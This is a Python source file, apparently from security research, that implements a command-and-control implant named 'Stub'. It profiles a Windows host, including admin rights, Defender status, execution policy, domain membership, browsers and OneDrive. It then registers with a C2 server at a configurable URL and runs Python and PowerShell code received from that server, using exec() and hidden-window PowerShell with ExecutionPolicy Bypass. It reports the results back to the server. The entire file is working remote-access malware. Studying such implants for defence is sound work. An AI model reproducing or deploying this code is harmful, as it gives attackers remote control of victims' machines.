# Copyright 2026 Netskope, Inc.
import platform
import os
import ctypes
import subprocess
import json
import time
import importlib.metadata
import requests 
import socket
import tempfile

#Client configuration. Please modify the C2_URL
C2_URL = "http://localhost:8888"
SLEEP_INTERVAL = 5

class Stub:
    def __init__(self):
        self.session_id = None
        self.system_context = {}
        self.processed_commands = set()
        self.connection_failures  = 0
        self.max_failures = 100

    def _run_powershell_command(self, command):
        """
        Helper function to run PowerShell commands and return output.
        """
        try:
            if os.name == 'nt':
                si = subprocess.STARTUPINFO()
                si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            else:
                si = None

            result = subprocess.run(
                ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", command],
                capture_output=True,
                text=True,
                timeout=5,
                startupinfo=si if os.name == 'nt' else None
            )
            return result.stdout.strip() if result.returncode == 0 else None
        except Exception as e:
            return None

    def _collect_additional_recon(self):
        """
        Collect additional reconnaissance data for bespoke script generation.
        Returns a dictionary with additional context.
        """
        additional_data = {}

        
        try:
            ps_version = self._run_powershell_command("$PSVersionTable.PSVersion.ToString()")
            additional_data['powershell_version'] = ps_version if ps_version else "Unknown"
        except:
            additional_data['powershell_version'] = "Unknown"

        
        try:
            profile_path = os.environ.get('USERPROFILE', 'Unknown')
            additional_data['user_profile_path'] = profile_path
        except:
            additional_data['user_profile_path'] = "Unknown"

        
        try:
            exec_policy = self._run_powershell_command("Get-ExecutionPolicy -Scope CurrentUser")
            additional_data['execution_policy'] = exec_policy if exec_policy else "Unknown"
        except:
            additional_data['execution_policy'] = "Unknown"

        
        try:
            defender_enabled = self._run_powershell_command(
                "(Get-MpComputerStatus).RealTimeProtectionEnabled"
            )
            additional_data['defender_realtime'] = defender_enabled if defender_enabled else "Unknown"
        except:
            additional_data['defender_realtime'] = "Unknown"

        
        browsers = []
        browser_paths = {
            'Chrome': r'C:\Program Files\Google\Chrome\Application\chrome.exe',
            'Firefox': r'C:\Program Files\Mozilla Firefox\firefox.exe',
            'Edge': r'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'
        }
        for browser, path in browser_paths.items():
            if os.path.exists(path):
                browsers.append(browser)
        additional_data['browsers_installed'] = browsers if browsers else ["None"]

        
        try:
            onedrive_path = os.environ.get('OneDrive', None)
            if onedrive_path and os.path.exists(onedrive_path):
                additional_data['onedrive_path'] = onedrive_path
            else:
                additional_data['onedrive_path'] = "Not configured"
        except:
            additional_data['onedrive_path'] = "Unknown"

        
        try:
            domain_joined = self._run_powershell_command(
                "(Get-WmiObject Win32_ComputerSystem).PartOfDomain"
            )
            additional_data['domain_joined'] = domain_joined if domain_joined else "Unknown"
        except:
            additional_data['domain_joined'] = "Unknown"

        
        try:
            dotnet_version = self._run_powershell_command(
                "[System.Runtime.InteropServices.RuntimeInformation]::FrameworkDescription"
            )
            additional_data['dotnet_version'] = dotnet_version if dotnet_version else "Unknown"
        except:
            additional_data['dotnet_version'] = "Unknown"

        return additional_data

    def fingerprint(self):
        """
        Phase 1: Gather Context
        """
        print("[*] Starting Fingerprint...")

        
        uname = platform.uname()
        hostname = socket.gethostname()
        os_info = f"{uname.system} {uname.release} ({uname.version})"
        self.system_context['os'] = uname.system
        self.system_context['os_version'] = uname.version
        self.system_context['hostname'] = hostname
        self.system_context['os_arch'] = platform.machine()
        self.system_context['temp_folder'] = tempfile.gettempdir()


        
        try:
            if uname.system == "Windows":
                is_admin = str(ctypes.windll.shell32.IsUserAnAdmin() != 0)

            else:
                is_admin = str(os.getuid() == 0)

        except Exception as e:
            is_admin = f"Failed to identify if user is running as administrator with error {e}"
        self.system_context['isadmin'] = (is_admin)

        
        print("[*] Collecting additional recon data...")
        self.system_context['additional_recon'] = self._collect_additional_recon()

        
        self._register_with_c2()

    def _register_with_c2(self):
        """
        Sends the fingerprint to C2 and gets a Session ID
        """
        print(f"victim fingerprint {self.system_context}")
        try:
            response = requests.post(f"{C2_URL}/register", json=self.system_context)
            self.session_id = response.json().get("session_id")
            print(f"Status code response {response.status_code}, and message is {response.text}")
            if response.status_code == 200:
                print(f"[+] Registered with Session ID: {self.session_id}")
            else:
                print(f"[-] C2 rejected registration: {response.status_code}")
        except TypeError as e:
            print(f"[-] Failed to register: type error {e}")
            
        except Exception as e:
            print(f"[-] Connection failed: {e}")

        time.sleep(SLEEP_INTERVAL)
    def execute_command(self, code_snippet, lang):
        """
        Phase 3: JIT Execution
        This takes raw Python code from the C2 and runs it in memory.
        """
        if lang == "py":
            try:
                
                import io
                from contextlib import redirect_stdout
                
                f = io.StringIO()
                with redirect_stdout(f):
                    
                    exec(code_snippet, {'__builtins__': __builtins__}, {})
                print({"status": "success", "output": f.getvalue()})
                return {"status": "success", "output": f.getvalue()}
            except Exception as e:
                return {"status": "error", "output": str(e)}
        elif lang == "ps":
            try:
                print("[*] ===== POWERSHELL SCRIPT EXECUTION START =====")
                print(f"[*] Script length: {len(code_snippet)} characters")

                print("[*] Script content:")
                print("-" * 60)
                print(code_snippet)
                print("-" * 60)

                cmd = [
                    "powershell",
                    "-NoProfile",
                    "-NonInteractive",
                    "-ExecutionPolicy", "Bypass",
                    "-Command", code_snippet
                ]

                
                if os.name == 'nt':
                    si = subprocess.STARTUPINFO()
                    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                else:
                    si = None

                print("[*] Executing PowerShell script (in-memory)...")
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    startupinfo=si if os.name == 'nt' else None
                )

                print(f"[*] PowerShell exit code: {result.returncode}")
                print(f"[*] STDOUT length: {len(result.stdout)} chars")
                print(f"[*] STDERR length: {len(result.stderr)} chars")

                if result.returncode == 0:
                    print("[✓] SUCCESS - Script executed successfully (exit code 0)")
                    if result.stdout:
                        print(f"[*] STDOUT output:\n{result.stdout}")
                    if result.stderr:
                        print(f"[!] STDERR (warnings):\n{result.stderr}")
                    print("[*] ===== POWERSHELL SCRIPT EXECUTION END (SUCCESS) =====")
                    return {"status": "success", "output": result.stdout}
                else:
                    print(f"[✗] FAILURE - Script failed with exit code {result.returncode}")
                    
                    error_output = result.stderr if result.stderr else result.stdout
                    if not error_output:
                        error_output = f"Script failed with exit code {result.returncode} (no error output captured)"
                    print(f"[!] Error output:\n{error_output}")
                    print("[*] ===== POWERSHELL SCRIPT EXECUTION END (FAILED) =====")
                    return {"status": "error", "output": error_output}
            except subprocess.TimeoutExpired:
                return {"status": "error", "output": "PowerShell script execution timed out (180 seconds)"}
            except Exception as e:
                return {"status": "error", "output": str(e)}
        else:
            error_msg = f"Unknown language '{lang}' - must be 'py' or 'ps'"
            print(f"[!] ERROR: {error_msg}")
            return {"status": "error", "output": error_msg}

    def start_loop(self):
        """
        Phase 2: The Attack Cycle Loop
        """
        print("[*] Entering Command Loop...")
        
        while True:
            try:
                if self.connection_failures >= self.max_failures:
                    print(f"[!] Connection failed {self.connection_failures} times. Re-registering...")
                    self.processed_commands.clear()
                    self._register_with_c2()
                    continue
                
                payload = {"session_id": self.session_id}
                response = requests.post(f"{C2_URL}/poll", json=payload)
                
                if response.status_code != 200:
                    print(f"[-] C2 returned status {response.status_code}. Retrying...")
                    self.connection_failures += 1
                    time.sleep(5)
                    continue 

                self.connection_failures = 0

            
                if not response.text.strip():
                    print("[-] C2 returned empty body. Retrying...")
                    time.sleep(5)
                    continue

            
                resp_data = response.json()
                print(f"{resp_data} - Response from server")
                
                command_type = resp_data.get("type")
                cmd_id = resp_data.get("cmd_id")
                
                if cmd_id in self.processed_commands:
                    print(f"[*] Skipping duplicate command {cmd_id}")
                    time.sleep(SLEEP_INTERVAL)
                    continue
                
                if command_type == "EXEC":
                    
                    print(f"\n[*] ===== RECEIVED EXEC COMMAND {cmd_id} =====")
                    print(f"[DEBUG] Full response data keys: {resp_data.keys()}")
                    try:
                        requests.post(f"{C2_URL}/ack", json={
                            "session_id": self.session_id,
                            "cmd_id": cmd_id,
                            "status": "received"
                        }, timeout=5)
                        print(f"[*] Sent ACK to server for command {cmd_id}")
                    except:
                        print(f"[!] Failed to send ACK (continuing anyway)")
                        pass  

                    code_to_run = resp_data.get("script")
                    lang = resp_data.get("lang", "ps").lower()

                    
                    print("\n[CRITICAL TEST] Testing stdin with ACTUAL script from server...")
                    test_cmd = ["powershell", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", "-"]
                    test_si = subprocess.STARTUPINFO() if os.name == 'nt' else None
                    if test_si:
                        test_si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                    test_result = subprocess.run(test_cmd, input=code_to_run, capture_output=True, text=True, startupinfo=test_si, timeout=10)
                    print(f"[CRITICAL TEST] Exit: {test_result.returncode}, STDOUT len: {len(test_result.stdout)}, STDERR len: {len(test_result.stderr)}")
                    if len(test_result.stdout) > 0:
                        print(f"[CRITICAL TEST] ✓ STDIN WORKS! Output: {test_result.stdout[:100]}")
                    else:
                        print(f"[CRITICAL TEST] ✗ STDIN FAILED - no output")
                    print()

                    print(f"[*] Language: {lang}")
                    print(f"[*] Script length: {len(code_to_run) if code_to_run else 0} characters")

                    if not code_to_run:
                        print(f"[!] ERROR: No script in response data!")
                        continue

                    result = self.execute_command(code_to_run, lang)

                    print(f"\n[*] ===== EXECUTION RESULT =====")
                    print(f"[*] Status: {result.get('status').upper()}")
                    if result.get('output'):
                        output_preview = result.get('output')[:500] if len(result.get('output')) > 500 else result.get('output')
                        print(f"[*] Output:\n{output_preview}")
                        if len(result.get('output')) > 500:
                            print(f"[*] (Output truncated, total length: {len(result.get('output'))} chars)")

                    
                    print(f"[*] Sending result back to C2 server...")
                    requests.post(f"{C2_URL}/result", json={
                        "session_id": self.session_id,
                        "cmd_id": cmd_id,
                        "result": result
                    })
                    print(f"[✓] Result sent to server for command {cmd_id}\n")

                    if cmd_id:
                        self.processed_commands.add(cmd_id)
                    
                elif command_type == "SLEEP":
                    
                    pass
                
                elif command_type == "KILL":
                    break

            except Exception as e:
                print(f"[!] Loop Error: {e}")
            

            time.sleep(SLEEP_INTERVAL)

if __name__ == "__main__":
    malware = Stub()
    malware.fingerprint() 
    malware.start_loop()  
